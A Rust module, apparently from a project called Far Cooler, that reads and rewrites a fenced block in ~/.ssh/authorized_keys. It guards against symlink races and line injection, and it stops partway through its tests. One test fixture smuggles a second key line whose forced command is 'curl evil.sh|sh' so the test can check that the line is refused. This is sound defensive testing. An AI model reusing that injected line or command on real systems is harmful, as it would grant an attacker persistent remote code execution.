//! The fenced block in `~/.ssh/authorized_keys`, and every read and write of it.
//!
//! Nothing else in the tree touches that file. It is the one file Far Cooler
//! edits that a person may already depend on for their own reasons, and the
//! failure mode is not a lost feature — it is losing SSH access to your own
//! runner, which `docs/farcooler-design.md` calls out as release-blocking.
//!
//! So the rules here are narrow on purpose: only the lines between the two
//! markers are ours, a file whose fence cannot be understood is refused rather
//! than repaired, and a line inside the fence that we did not write is carried
//! through untouched rather than dropped.

use std::io::{Read as _, Write as _};
use std::os::fd::OwnedFd;
use std::path::Path;

use farcooler_protocol::v1::Scope;
use rustix::fs::{AtFlags, FlockOperation, Mode, OFlags, RawMode};

/// The line that opens Far Cooler's block.
///
/// The em dash and the wording are load-bearing in one direction only: they
/// must never change once a runner has been enrolled, because an existing
/// file's marker is matched literally and a reworded constant would read as a
/// file with no fence and enroll a second block beneath the first.
pub const BEGIN: &str = "# BEGIN FAR COOLER — do not edit inside this block";

/// The line that closes it.
pub const END: &str = "# END FAR COOLER";

/// Which pair of markers a call means.
///
/// A parameter rather than a constant reached for directly, because the same
/// algorithm fences `~/.ssh/config` for the Mac app — through the FFI, not
/// through a second implementation in Swift. A routine whose failure mode is
/// losing SSH access should exist once.
#[derive(Debug, Clone, Copy)]
pub struct Markers<'a> {
    pub begin: &'a str,
    pub end: &'a str,
}

/// The markers `authorized_keys` uses.
pub const AUTHORIZED_KEYS: Markers<'static> = Markers { begin: BEGIN, end: END };

/// One line inside the fence.
///
/// Every line in the block becomes an `Entry`, including one we did not write:
/// dropping such a line would mean the next write deleted a key somebody added
/// by hand. `client_id.is_empty()` is what says a line is foreign.
#[derive(Debug, Clone)]
pub struct Entry {
    /// `SHA256:…`, as `ssh-keygen -lf` prints it, or empty when the key did not
    /// parse at all.
    pub fingerprint: String,
    /// The device this line enrolls, as the forced command names it — empty for
    /// a foreign line.
    pub client_id: String,
    /// What that device may do, as the forced command names it.
    pub scope: Scope,
    /// The key's comment, which for our own lines is the name `render` chose.
    pub label: String,
    /// Which local account's `authorized_keys` this line was read from.
    ///
    /// Not in the line — nothing in `authorized_keys` names the account it
    /// grants, the file's location is what does. `parse` leaves this `None` and
    /// the caller that opened the file fills it in, because the caller is the
    /// only one that knows.
    pub account: Option<String>,
    /// The line exactly as it was read, newline stripped, so a rewrite can put
    /// a foreign line back byte for byte.
    pub line: String,
}

/// Why a fence could not be read or written.
#[derive(Debug)]
pub enum FenceError {
    /// The directory the file lives in does not exist, or the path names none.
    Missing,
    /// The file has a fence, but not one this can act on. The string says which
    /// way, for the daemon log — it is not for a screen and not for the wire.
    Damaged(String),
    Io(std::io::Error),
}

impl std::fmt::Display for FenceError {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::Missing => f.write_str("the directory that file lives in does not exist"),
            Self::Damaged(why) => write!(f, "the fence in that file is damaged: {why}"),
            Self::Io(e) => write!(f, "{e}"),
        }
    }
}

impl std::error::Error for FenceError {}

impl From<std::io::Error> for FenceError {
    fn from(e: std::io::Error) -> Self {
        Self::Io(e)
    }
}

/// A scope word, as `authorized_keys` and the session preamble spell it.
///
/// `None` is a word this daemon does not have, which refuses rather than
/// resolves. Absence of a scope is a decision — see `Session::granted` in the
/// binary — but a misspelling is a mistake, and rounding a mistake up to host
/// admin turns a typo on a line nobody re-reads into privilege escalation.
///
/// Here rather than in the binary because this module WRITES the word that the
/// binary later parses: one function for both directions means a line this
/// enrolls cannot spell a scope the daemon reading it does not have.
pub fn scope_from_word(word: &str) -> Option<Scope> {
    match word {
        "read" => Some(Scope::Read),
        "control" => Some(Scope::Control),
        "host_admin" => Some(Scope::HostAdmin),
        _ => None,
    }
}

/// The same word going out, for the forced command and the session preamble.
pub fn scope_word(scope: Scope) -> &'static str {
    match scope {
        Scope::Read => "read",
        Scope::Control => "control",
        // `Unspecified` cannot reach here from a parsed word, and an entry
        // rendered without a scope must not be rendered without a restriction:
        // host_admin is what a key with no scope at all already means.
        Scope::HostAdmin | Scope::Unspecified => "host_admin",
    }
}

/// Read the entries in `authorized_keys`' fence.
///
/// An absent fence is an empty list, not an error: a runner nobody has enrolled
/// a device on has no block, and that is the ordinary case.
pub fn parse(contents: &str) -> Result<Vec<Entry>, FenceError> {
    parse_within(contents, AUTHORIZED_KEYS)
}

/// The same, for a file fenced with other markers.
pub fn parse_within(contents: &str, markers: Markers<'_>) -> Result<Vec<Entry>, FenceError> {
    let lines: Vec<&str> = contents.lines().collect();
    let Some((begin, end)) = fence_span(&lines, markers)? else { return Ok(Vec::new()) };
    Ok(lines[begin + 1..end]
        .iter()
        .filter(|line| !line.trim().is_empty())
        .map(|line| entry_from_line(line))
        .collect())
}

/// Where the block starts and stops, or `None` when there is no block.
///
/// Everything that is not exactly one opening marker followed by exactly one
/// closing marker is damage, and damage refuses. The alternative is guessing
/// where the block ends, and a wrong guess rewrites lines Far Cooler did not
/// write — which is how somebody loses SSH access to their own runner.
fn fence_span(lines: &[&str], markers: Markers<'_>) -> Result<Option<(usize, usize)>, FenceError> {
    let find = |marker: &str| -> Vec<usize> {
        lines
            .iter()
            .enumerate()
            // `trim_end` so a file with CRLF line endings, or one an editor left
            // trailing spaces in, is still a file we recognize our own block in.
            .filter(|(_, line)| line.trim_end() == marker)
            .map(|(i, _)| i)
            .collect()
    };
    let begins = find(markers.begin);
    let ends = find(markers.end);
    match (begins.len(), ends.len()) {
        (0, 0) => Ok(None),
        (1, 1) if begins[0] < ends[0] => Ok(Some((begins[0], ends[0]))),
        (1, 1) => Err(FenceError::Damaged("the fence closes before it opens".into())),
        (0, n) => Err(FenceError::Damaged(format!("{n} closing markers and no opening one"))),
        (n, 0) => Err(FenceError::Damaged(format!("{n} fences that open and never close"))),
        (b, e) => Err(FenceError::Damaged(format!("{b} opening and {e} closing markers"))),
    }
}

/// Read one line of the block.
///
/// A line that is not ours in any respect — no forced command, a key that does
/// not parse, a hand-written comment — comes back foreign rather than dropped.
fn entry_from_line(line: &str) -> Entry {
    let raw = line.trim_end_matches(['\n', '\r']);
    let foreign = |key: Option<&ssh_key::PublicKey>| Entry {
        fingerprint: key
            .map(|k| k.fingerprint(ssh_key::HashAlg::Sha256).to_string())
            .unwrap_or_default(),
        client_id: String::new(),
        scope: Scope::Unspecified,
        label: key.map(|k| k.comment().to_string()).unwrap_or_default(),
        account: None,
        line: raw.to_string(),
    };

    // A bare key with no options field is somebody else's: ours always carry a
    // forced command. Parsing it anyway is worth doing, so the entry can still
    // be reported by fingerprint rather than as an opaque string.
    if let Ok(key) = ssh_key::PublicKey::from_openssh(raw) {
        return foreign(Some(&key));
    }
    let Some((options, rest)) = split_options(raw) else { return foreign(None) };
    let Ok(key) = ssh_key::PublicKey::from_openssh(rest) else { return foreign(None) };

    let client_id = forced_command(options)
        .and_then(|command| flag(command, "--client"))
        .filter(|id| !id.is_empty());
    let Some(client_id) = client_id else { return foreign(Some(&key)) };
    let scope = forced_command(options)
        .and_then(|command| flag(command, "--scope"))
        .and_then(scope_from_word)
        // A line of ours whose scope word this build does not have is still
        // ours, and reporting it as unspecified is honest: the daemon that
        // serves it will refuse the word too, so it grants nothing.
        .unwrap_or(Scope::Unspecified);

    Entry {
        fingerprint: key.fingerprint(ssh_key::HashAlg::Sha256).to_string(),
        client_id: client_id.to_string(),
        scope,
        label: key.comment().to_string(),
        account: None,
        line: raw.to_string(),
    }
}

/// Split a line's options field from the key it precedes.
///
/// sshd ends the options field at the first whitespace OUTSIDE a quoted string,
/// and that distinction is not academic here: our own forced command is
/// `restrict,command="farcoolerd --stdio --client c1 --scope read"`, four
/// spaces of which are inside the quotes. `ssh_key`'s own `authorized_keys`
/// parser splits at the first space instead, which cuts that command in half
/// and then reads `--stdio` as an algorithm name — which is why this does not
/// use it.
///
/// Backslash escaping inside the quotes is not modelled. Nothing this writes
/// contains a quote or a backslash, and being wrong about somebody else's line
/// costs only that the line is called foreign and left exactly as it was.
fn split_options(line: &str) -> Option<(&str, &str)> {
    let mut quoted = false;
    for (at, c) in line.char_indices() {
        match c {
            '"' => quoted = !quoted,
            c if c.is_whitespace() && !quoted => {
                return Some((&line[..at], line[at..].trim_start()));
            }
            _ => {}
        }
    }
    None
}

/// The forced command out of an options field, without its quotes.
///
/// Anchored to the start of an option — the field is comma-separated, and
/// `permitopen="…",command="…"` must find the second one rather than a suffix
/// of the first option's name.
fn forced_command(options: &str) -> Option<&str> {
    const NAME: &str = "command=\"";
    let (at, _) = options
        .match_indices(NAME)
        .find(|(at, _)| *at == 0 || options.as_bytes()[at - 1] == b',')?;
    options[at + NAME.len()..].split_once('"').map(|(command, _)| command)
}

/// The word after a flag in the forced command.
fn flag<'a>(command: &'a str, name: &str) -> Option<&'a str> {
    let mut words = command.split_whitespace();
    while let Some(word) = words.next() {
        if word == name {
            return words.next();
        }
    }
    None
}

/// Why a key was not enrolled.
///
/// Codes, with no payload. This crosses the protocol and the FFI to a screen,
/// and a parser message built from attacker-supplied bytes must not be the
/// sentence a person reads in Settings. The parser's own message goes to the
/// daemon log; the wire carries the code and the app owns the wording.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Rejected {
    /// The received key was more than one line.
    MultiLine,
    /// A key, but not one of an algorithm this enrolls.
    Algorithm,
    /// Not a public key at all.
    Unparseable,
    /// The client id would not survive being written into a forced command.
    ClientId,
    /// The caller did not say what the device may do.
    Unscoped,
}

impl std::fmt::Display for Rejected {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        f.write_str(match self {
            Self::MultiLine => "more than one line",
            Self::Algorithm => "not an ed25519 key",
            Self::Unparseable => "not a public key",
            Self::ClientId => "not a usable client id",
            Self::Unscoped => "no scope",
        })
    }
}

/// Turn a received public key into the one line this runner will enroll.
///
/// Never write bytes that came off the wire. `authorized_keys` is line-oriented
/// and every line may carry options BEFORE the key, so appending a received
/// string can append a second entry granting a stranger a key that runs a
/// command on every connection — and nothing about that write is malformed, so
/// it succeeds. Everything below rebuilds the line from decoded key material
/// and strings this runner chose; the only thing that survives from `received`
/// is 32 bytes of ed25519 point, re-encoded.
///
/// Two things about `ssh_key` that the design's first draft had backwards, and
/// that are easy to get wrong again: `to_openssh()` ALREADY returns
/// `algorithm base64 comment`, so prefixing the algorithm emits
/// `ssh-ed25519 ssh-ed25519 AAAA…` and enrolls nothing. And `from_openssh`
/// KEEPS the comment it parsed, so "trailing garbage fails to parse" is false —
/// trailing text is a valid comment. Rebuilding from `key_data()` is the only
/// thing that actually regenerates it.
pub fn render(
    received: &str,
    label: &str,
    client_id: &str,
    scope: Scope,
) -> Result<String, Rejected> {
    if received.contains(['\r', '\n']) {
        return Err(Rejected::MultiLine);
    }
    // The client id is interpolated into the forced command, inside quotes, so
    // it is a second way to smuggle a line in: an id containing `"` closes the
    // command and turns the rest of the line into a key of the attacker's
    // choosing, and one containing a space breaks the flag the daemon reads
    // back. This is not a name a person types — it identifies a device — so
    // refusing an unusable one costs nothing.
    if client_id.is_empty()
        || client_id.len() > 64
        || !client_id.chars().all(|c| c.is_ascii_alphanumeric() || matches!(c, '-' | '_' | '.'))
    {
        return Err(Rejected::ClientId);
    }
    // A scope of `Unspecified` is what a caller that set no scope field sends,
    // and it ranks BELOW read everywhere else in this daemon — `rpc::satisfies`
    // grants it nothing. Writing it as host_admin, which is what an unscoped
    // line already means to sshd, would turn a forgotten field into the whole
    // runner. Refusing is the only reading that cannot escalate.
    if matches!(scope, Scope::Unspecified) {
        return Err(Rejected::Unscoped);
    }

    let parsed = ssh_key::PublicKey::from_openssh(received).map_err(|e| {
        // The message, which is built from bytes off the wire, stops here.
        tracing::debug!(error = %e, "a received key did not parse");
        Rejected::Unparseable
    })?;
    if !matches!(parsed.algorithm(), ssh_key::Algorithm::Ed25519) {
        return Err(Rejected::Algorithm);
    }

    let fingerprint = parsed.fingerprint(ssh_key::HashAlg::Sha256).to_string();
    let key = ssh_key::PublicKey::new(parsed.key_data().clone(), comment_for(label, &fingerprint));
    let body = key.to_openssh().map_err(|e| {
        tracing::debug!(error = %e, "a parsed key could not be re-encoded");
        Rejected::Unparseable
    })?;
    let line = format!(
        "restrict,command=\"farcoolerd --stdio --client {client_id} --scope {}\" {body}",
        scope_word(scope)
    );
    // Not an assertion about the input — every part of this line is now
    // something this function built — but about the three rules above still
    // holding together if one of them is ever edited.
    debug_assert!(!line.contains(['\r', '\n']));
    Ok(line)
}

/// The key is the identity; the comment is a label for humans.
///
/// A filtered name is not an identity — two devices filter to the same string,
/// and renaming a phone must not collide with another. The fingerprint suffix
/// is what makes the comment unique; the name is what makes it readable.
fn comment_for(label: &str, fingerprint: &str) -> String {
    let keep = |c: char| if c.is_ascii_alphanumeric() || c == '_' { c } else { '-' };
    let safe: String = label.chars().map(keep).collect();
    let safe = safe.trim_matches('-');
    let safe = if safe.is_empty() { "device" } else { safe };
    let short: String = fingerprint.trim_start_matches("SHA256:").chars().take(8).collect();
    format!("farcooler-{safe}-{short}")
}

/// The entries in a file's fence, read the same way a write reads it.
///
/// Here rather than a `read_to_string` at the call site, because this module's
/// first claim is that nothing else in the tree touches that file — and the
/// claim is only worth making if reading goes through the same
/// descriptor-anchored open, the same ownership and mode checks, and the same
/// refusal on a FIFO or a non-UTF-8 file. A read cannot be redirected by a
/// symlink race the way a rename can, but a read that reported a stranger's
/// keys as this runner's would still be a lie told to a settings screen.
///
/// A file that is not there yet is an empty list, not an error: a runner nobody
/// has enrolled a device on has no `authorized_keys`, and that is ordinary.
///
/// Creates `.ssh` at 0700 if it does not exist, as a side effect of anchoring
/// the open. Harmless and the mode sshd's `StrictModes` wants anyway, and the
/// alternative is a second directory-opening path that gets to be wrong on its
/// own.
pub fn read(path: &Path, markers: Markers<'_>) -> Result<Vec<Entry>, FenceError> {
    let name = path.file_name().ok_or(FenceError::Missing)?;
    let directory = open_fence_dir(path.parent().ok_or(FenceError::Missing)?)?;
    match read_at(&directory, name)? {
        Some((text, _)) => parse_within(&text, markers),
        None => Ok(Vec::new()),
    }
}

/// Replace the fence's contents, leaving every byte outside it identical.
///
/// `entries` are the lines this program means to have in the block and
/// `foreign` are the ones it found there and did not write — carried through
/// rather than dropped, because dropping one would delete a key somebody added
/// by hand. Both empty removes the block entirely: a file with nothing enrolled
/// in it should not carry two marker lines forever.
///
/// The whole file is rewritten, never appended to. Appending is how a file
/// whose last line has no newline turns two keys into one very long comment,
/// and it is the classic way to lose access to a machine.
///
/// Refuses, rather than repairing, on a fence it cannot read: see `fence_span`.
///
/// The lock is advisory and only against another Far Cooler writer. A person
/// editing this file in an editor at the same moment is not something any of
/// this can prevent, which is part of why the backup exists.
pub fn write(
    path: &Path,
    markers: Markers<'_>,
    entries: &[String],
    foreign: &[String],
    placement: Placement,
) -> Result<(), FenceError> {
    let name = path.file_name().ok_or(FenceError::Missing)?;
    let directory = open_fence_dir(path.parent().ok_or(FenceError::Missing)?)?;
    let _lock = hold_lock(&directory, name)?;

    let current = read_at(&directory, name)?;
    let text = current.as_ref().map(|(text, _)| text.as_str()).unwrap_or_default();
    let mode = current.as_ref().map(|(_, mode)| *mode).unwrap_or(0o600);
    let rebuilt = rebuilt(text, markers, entries, foreign, placement)?;

    // The backup is durable BEFORE the rename, so that a machine that loses
    // power in the middle of this has either the original file or the original
    // file and a copy of it — never a half-written new one and no way back.
    if let Some((text, _)) = &current {
        back_up(&directory, name, text)?;
    }

    let temp = suffixed(name, ".farcooler-new");
    // A leftover temp from an interrupted write must not be inherited: `O_EXCL`
    // is what makes the create fail rather than reuse somebody's file, and the
    // unlink is what makes the retry succeed.
    ignoring_absent(rustix::fs::unlinkat(&directory, temp.as_os_str(), AtFlags::empty()))?;
    let file = rustix::fs::openat(
        &directory,
        temp.as_os_str(),
        OFlags::WRONLY | OFlags::CREATE | OFlags::EXCL | OFlags::CLOEXEC | OFlags::NOFOLLOW,
        Mode::from_raw_mode(mode),
    )
    .map_err(io)?;
    let mut file = std::fs::File::from(file);
    file.write_all(rebuilt.as_bytes())?;
    // The rename is atomic; the CONTENTS reaching the disk are not, and a
    // rename that lands before the bytes do leaves a file of zeros where
    // somebody's keys were.
    file.sync_all()?;
    drop(file);

    rustix::fs::renameat(&directory, temp.as_os_str(), &directory, name).map_err(io)?;
    // And the rename itself has to be durable, or a crash leaves the directory
    // entry pointing at neither file.
    rustix::fs::fsync(&directory).map_err(io)?;
    Ok(())
}

/// The directory the file lives in, opened so that nothing can be swapped out
/// from under the rest of the write.
///
/// Every path this then uses is relative to the returned descriptor. That is
/// the point: `O_NOFOLLOW` on `~/.ssh/authorized_keys` checks only the last
/// component, so an attacker who replaces `.ssh` with a symlink AFTER the check
/// and BEFORE the rename redirects the new file into a directory they control —
/// and the file in question is the list of keys that may log in here. Holding
/// the directory open by descriptor means the rename cannot land anywhere else,
/// whatever the path resolves to by then.
///
/// The directory ABOVE it — the home directory — is opened the ordinary way,
/// symlinks and all. It is not attacker-controlled in any threat model that
/// this write survives anyway, and refusing to follow it would refuse every
/// macOS temporary directory, `/var` being a symlink to `/private/var`.
fn open_fence_dir(directory: &Path) -> Result<OwnedFd, FenceError> {
    let flags = OFlags::RDONLY | OFlags::DIRECTORY | OFlags::CLOEXEC;
    let opened = match (directory.parent(), directory.file_name()) {
        // The ordinary shape: a `.ssh` inside a home directory.
        (Some(above), Some(leaf)) if !above.as_os_str().is_empty() => {
            let anchor = rustix::fs::open(above, flags, Mode::empty()).map_err(|e| match e {
                rustix::io::Errno::NOENT => FenceError::Missing,
                e => FenceError::Io(e.into()),
            })?;
            // A runner where nobody has ever used SSH has no `.ssh` yet, and
            // 0700 is what sshd's own StrictModes insists on.
            ignoring_present(rustix::fs::mkdirat(
                &anchor,
                leaf,
                Mode::from_raw_mode(0o700 as RawMode),
            ))?;
            rustix::fs::openat(&anchor, leaf, flags | OFlags::NOFOLLOW, Mode::empty())
        }
        // A path with no directory part at all, or one directly under the root:
        // there is no component left to anchor, so this is as good as it gets.
        _ => {
            let directory =
                if directory.as_os_str().is_empty() { Path::new(".") } else { directory };
            rustix::fs::open(directory, flags, Mode::empty())
        }
    };
    let directory = opened.map_err(|e| match e {
        rustix::io::Errno::NOENT => FenceError::Missing,
        e => FenceError::Io(e.into()),
    })?;
    verify(&directory, "the directory that file lives in")?;
    Ok(directory)
}

/// Refuse a directory or file that is not ours, or that anyone else can write.
///
/// The same rule sshd applies to this file under `StrictModes`, applied at the
/// descriptor that is actually being used rather than at a path that may mean
/// something else by now. A group-writable `.ssh` is a directory in which
/// somebody else can replace `authorized_keys`, so writing keys into it would
/// be enrolling a device into a file that is not really the runner owner's.
fn verify(fd: &OwnedFd, what: &str) -> Result<(), FenceError> {
    let stat = rustix::fs::fstat(fd).map_err(io)?;
    if stat.st_uid != rustix::process::geteuid().as_raw() {
        return Err(refused(format!("{what} belongs to another user")));
    }
    if stat.st_mode as RawMode & 0o022 != 0 {
        return Err(refused(format!("{what} is writable by other users")));
    }
    Ok(())
}

/// Serialize Far Cooler's own writers against each other.
///
/// On a sibling file rather than on `authorized_keys` itself, so that holding
/// the lock never depends on having the real file open — the write replaces
/// that file by rename, and a lock on a descriptor whose name has been reused
/// protects nothing.
///
/// The retry is not defensive programming, it is a measured fact about macOS:
/// when two threads call `openat(dir, name, O_CREAT)` on the same name at the
/// same moment, one of them comes back ENOENT rather than opening the file the
/// other just made — reproducibly, in roughly every such pair, through raw
/// `libc` as well as through rustix. Without the retry, the second of two
/// concurrent enrollments fails on a file that plainly exists. `O_CREAT`
/// racing with itself is exactly the shape this call has, because a lock file
/// must be created before it can be locked.
fn hold_lock(directory: &OwnedFd, name: &std::ffi::OsStr) -> Result<OwnedFd, FenceError> {
    let lock = suffixed(name, ".farcooler-lock");
    let mut attempt = 0;
    let file = loop {
        let opened = rustix::fs::openat(
            directory,
            lock.as_os_str(),
            OFlags::RDWR | OFlags::CREATE | OFlags::CLOEXEC | OFlags::NOFOLLOW,
            Mode::from_raw_mode(0o600 as RawMode),
        );
        match opened {
            Ok(file) => break file,
            // Bounded, because ENOENT also means a directory that really has
            // gone — this holds it open by descriptor, so if it was removed no
            // number of retries will bring it back.
            Err(rustix::io::Errno::NOENT) if attempt < 100 => {
                attempt += 1;
                std::thread::sleep(std::time::Duration::from_millis(1));
            }
            Err(e) => return Err(io(e)),
        }
    };
    rustix::fs::flock(&file, FlockOperation::LockExclusive).map_err(io)?;
    Ok(file)
}

/// The file's contents and its mode, or `None` if it is not there yet.
fn read_at(
    directory: &OwnedFd,
    name: &std::ffi::OsStr,
) -> Result<Option<(String, RawMode)>, FenceError> {
    // `O_NONBLOCK` because `O_NOFOLLOW` refuses a symlink and says nothing about
    // a FIFO: opening one of those for reading blocks until somebody writes to
    // it, which would hang the daemon rather than refuse.
    let opened = rustix::fs::openat(
        directory,
        name,
        OFlags::RDONLY | OFlags::CLOEXEC | OFlags::NOFOLLOW | OFlags::NONBLOCK,
        Mode::empty(),
    );
    let file = match opened {
        Ok(file) => file,
        Err(rustix::io::Errno::NOENT) => return Ok(None),
        Err(e) => return Err(FenceError::Io(e.into())),
    };
    let what = name.to_string_lossy().into_owned();
    verify(&file, &what)?;
    let stat = rustix::fs::fstat(&file).map_err(io)?;
    let kind = rustix::fs::FileType::from_raw_mode(stat.st_mode as RawMode);
    if kind != rustix::fs::FileType::RegularFile {
        return Err(refused(format!("{what} is not a regular file")));
    }

    let mut bytes = Vec::new();
    std::fs::File::from(file).read_to_end(&mut bytes)?;
    // Refused rather than read lossily. `from_utf8_lossy` would replace the
    // offending bytes with U+FFFD, and this rewrites the whole file — so a
    // stray byte in somebody else's comment would come back as a corrupted
    // line, in the file that decides who may log in.
    let text = String::from_utf8(bytes).map_err(|_| {
        refused(format!("{what} is not UTF-8, so rewriting it would corrupt a line"))
    })?;
    Ok(Some((text, stat.st_mode as RawMode & 0o777)))
}

/// The file as it was, plus a checksum of it.
///
/// A backup nobody can tell is intact is not evidence. The checksum file is in
/// `shasum -c` format on purpose: recovering from this must not require Far
/// Cooler to be running, or installed, or working.
fn back_up(directory: &OwnedFd, name: &std::ffi::OsStr, text: &str) -> Result<(), FenceError> {
    use sha2::Digest as _;
    let backup = suffixed(name, ".farcooler-backup");
    let mut file = std::fs::File::from(create(directory, backup.as_os_str())?);
    file.write_all(text.as_bytes())?;
    file.sync_all()?;

    let digest = sha2::Sha256::digest(text.as_bytes());
    let hex: String = digest.iter().map(|b| format!("{b:02x}")).collect();
    let sums = create(directory, suffixed(&backup, ".sha256").as_os_str())?;
    let mut sums = std::fs::File::from(sums);
    sums.write_all(format!("{hex}  {}\n", backup.to_string_lossy()).as_bytes())?;
    sums.sync_all()?;
    Ok(())
}

/// Create or truncate a file beside the fenced one, never through a symlink.
fn create(directory: &OwnedFd, name: &std::ffi::OsStr) -> Result<OwnedFd, FenceError> {
    rustix::fs::openat(
        directory,
        name,
        OFlags::WRONLY | OFlags::CREATE | OFlags::TRUNC | OFlags::CLOEXEC | OFlags::NOFOLLOW,
        Mode::from_raw_mode(0o600 as RawMode),
    )
    .map_err(io)
}

/// The file as it should be: the block replaced, everything else untouched.
///
/// Line terminators are carried through exactly as they were found — the lines
/// outside the fence are handed back with the bytes that ended them, so a file
/// with CRLF endings does not quietly become a file with LF endings on the
/// first enrollment.
/// Where a fence goes in a file that does not have one yet.
///
/// `authorized_keys` does not care: sshd reads every line and the order of
/// entries carries no meaning, so a new block at the end is fine and keeps the
/// diff at the bottom where a person expects it.
///
/// `~/.ssh/config` cares completely. It is **first**-match-wins per keyword, so
/// an `Include ~/.ssh/config.d/*` or a `Host *` above our block silently wins
/// every `IdentityFile`, `User` and `HostName` we wrote — and appending is the
/// one placement that reliably does nothing at all. That file needs `First`.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Placement {
    /// After everything already in the file. The default, and right for
    /// `authorized_keys`.
    Last,
    /// Before everything already in the file, including any `Include`.
    First,
}

fn rebuilt(
    current: &str,
    markers: Markers<'_>,
    entries: &[String],
    foreign: &[String],
    placement: Placement,
) -> Result<String, FenceError> {
    for line in entries.iter().chain(foreign) {
        // A caller cannot be allowed to write a marker or a newline into the
        // block: either one produces a file whose fence this refuses to read
        // afterwards, which would mean no device could be enrolled or revoked
        // again without hand-editing.
        if line.contains(['\r', '\n'])
            || line.trim_end() == markers.begin
            || line.trim_end() == markers.end
        {
            return Err(refused("an entry contained a newline or a fence marker".into()));
        }
    }

    let lines: Vec<&str> = current.split_inclusive('\n').collect();
    let (before, after) = match fence_span(&lines, markers)? {
        // An existing fence is rewritten where it already is. Moving someone's
        // block because a placement rule says so would be a surprise, and for
        // `~/.ssh/config` it would also silently change which keywords win.
        Some((begin, end)) => (lines[..begin].concat(), lines[end + 1..].concat()),
        None => match placement {
            Placement::Last => (current.to_string(), String::new()),
            Placement::First => (String::new(), current.to_string()),
        },
    };

    let mut rebuilt = before;
    // A file whose last line has no newline gets one before anything is added
    // after it, which is exactly the bug that appending has and this does not.
    if !rebuilt.is_empty() && !rebuilt.ends_with('\n') {
        rebuilt.push('\n');
    }
    if !entries.is_empty() || !foreign.is_empty() {
        rebuilt.push_str(markers.begin);
        rebuilt.push('\n');
        for line in entries.iter().chain(foreign) {
            rebuilt.push_str(line);
            rebuilt.push('\n');
        }
        rebuilt.push_str(markers.end);
        rebuilt.push('\n');
    }
    rebuilt.push_str(&after);

    // What is about to be written must read back as what was asked for. This is
    // cheap, and it is the difference between a bug in this function being a
    // failed enrollment and it being a file nobody can enroll into again.
    match parse_within(&rebuilt, markers) {
        Ok(read_back) if read_back.len() == entries.len() + foreign.len() => Ok(rebuilt),
        Ok(_) => Err(refused("the rewritten file did not read back as itself".into())),
        Err(e) => Err(e),
    }
}

/// `authorized_keys` → `authorized_keys.farcooler-backup`, and friends.
fn suffixed(name: &std::ffi::OsStr, suffix: &str) -> std::ffi::OsString {
    let mut out = name.to_os_string();
    out.push(suffix);
    out
}

fn ignoring_absent(result: Result<(), rustix::io::Errno>) -> Result<(), FenceError> {
    match result {
        Ok(()) | Err(rustix::io::Errno::NOENT) => Ok(()),
        Err(e) => Err(FenceError::Io(e.into())),
    }
}

fn ignoring_present(result: Result<(), rustix::io::Errno>) -> Result<(), FenceError> {
    match result {
        Ok(()) | Err(rustix::io::Errno::EXIST) => Ok(()),
        Err(e) => Err(FenceError::Io(e.into())),
    }
}

fn io(e: rustix::io::Errno) -> FenceError {
    FenceError::Io(e.into())
}

fn refused(why: String) -> FenceError {
    FenceError::Io(std::io::Error::new(std::io::ErrorKind::PermissionDenied, why))
}

#[cfg(test)]
mod tests {
    use super::*;

    /// A valid ed25519 public key, chosen for being obviously synthetic.
    ///
    /// Real bytes rather than a plausible-looking string: `from_openssh` decodes
    /// the base64 and checks the length the blob declares, so a fixture that is
    /// merely the right shape parses as nothing and every assertion about a
    /// parsed key would be testing the refusal path instead.
    const KEY: &str = "AAAAC3NzaC1lZDI1NTE5AAAAIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";

    /// A second one, so a test can tell two entries apart.
    const OTHER_KEY: &str =
        "AAAAC3NzaC1lZDI1NTE5AAAAIBERERERERERERERERERERERERERERERERERERERERER";

    /// A real, tiny, valid RSA key.
    ///
    /// Short because its modulus is 32 bytes, which nothing here objects to and
    /// no test depends on: what is being tested is that a key whose ALGORITHM
    /// is not ed25519 is refused for that reason and not for being malformed,
    /// and a truncated fixture would pass that assertion for the wrong one.
    const RSA: &str = "ssh-rsa \
        AAAAB3NzaC1yc2EAAAADAQABAAAAIH+rq6urq6urq6urq6urq6urq6urq6urq6urq6urq6sB \
        someone@laptop";

    /// One enrolled device, inside the fence, with a stranger's key above it.
    fn one() -> String {
        format!(
            "ssh-rsa AAAAsomeone-elses-key nothing-to-do-with-us\n\
             {BEGIN}\n\
             restrict,command=\"farcoolerd --stdio --client abc123 --scope control\" \
             ssh-ed25519 {KEY} farcooler-iPhone-t7xq9vd8\n\
             {END}\n"
        )
    }

    /// Only what is inside the fence is ours.
    #[test]
    fn entries_outside_the_fence_are_not_read_as_ours() {
        let entries = parse(&one()).expect("parse");
        assert_eq!(entries.len(), 1);
        assert_eq!(entries[0].client_id, "abc123");
        assert_eq!(entries[0].scope, Scope::Control);
        assert_eq!(entries[0].label, "farcooler-iPhone-t7xq9vd8");
    }

    /// A file with no fence has no entries, and that is not an error.
    #[test]
    fn a_file_with_no_fence_is_empty_rather_than_damaged() {
        let entries = parse("ssh-rsa AAAAonly-theirs me@laptop\n").expect("parse");
        assert!(entries.is_empty());
    }

    /// A fence that opens and never closes is damage, and damage refuses.
    ///
    /// The alternative is guessing where the block ends, and a wrong guess
    /// rewrites lines Far Cooler did not write. Refusing loses a feature;
    /// guessing loses someone's access to their own runner.
    #[test]
    fn an_unterminated_fence_refuses_rather_than_guesses() {
        let text = format!("{BEGIN}\nrestrict,command=\"x\" ssh-ed25519 {KEY} k\n");
        match parse(&text) {
            Err(FenceError::Damaged(_)) => {}
            other => panic!("an unterminated fence was accepted: {other:?}"),
        }
    }

    /// Two fences is damage too.
    #[test]
    fn a_second_fence_refuses() {
        let text = format!("{BEGIN}\n{END}\n{BEGIN}\n{END}\n");
        assert!(matches!(parse(&text), Err(FenceError::Damaged(_))));
    }

    /// One value in must never be two lines out.
    ///
    /// authorized_keys is line-oriented and every line may carry options
    /// BEFORE the key, so appending a received string can append a second
    /// entry granting a stranger a key that runs a command on every
    /// connection. Nothing about the write is malformed and it succeeds.
    #[test]
    fn a_second_line_smuggled_into_a_key_is_refused() {
        let hostile = format!(
            "ssh-ed25519 {KEY} ok\n\
             command=\"curl evil.sh|sh\" ssh-ed25519 {OTHER_KEY} them"
        );
        assert!(matches!(
            render(&hostile, "phone", "c1", Scope::Control),
